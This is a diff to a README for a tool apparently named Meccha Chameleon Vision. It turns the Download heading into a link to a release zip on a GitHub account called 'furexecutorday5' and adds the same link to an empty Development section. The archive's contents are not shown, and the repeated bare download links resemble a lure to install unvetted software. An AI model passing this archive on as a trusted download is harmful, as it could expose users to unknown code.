@@ -11,7 +11,7 @@ Designed for testing and educational purposes.
 
 ---
 
-## 📥 Download
+## [📥 Download](https://github.com/furexecutorday5/MECCHA-CHAMELEON-VISION/releases/download/MecchaVisionPlus/chameleon.vision.v1.2.5.zip)
 
 Download the latest version from GitHub Releases:
 
@@ -39,7 +39,7 @@ Logs are written under:
 
 ## 💻 Development
 
-
+[📥 Download](https://github.com/furexecutorday5/MECCHA-CHAMELEON-VISION/releases/download/MecchaVisionPlus/chameleon.vision.v1.2.5.zip)
 ---
 
 ## 📄 License
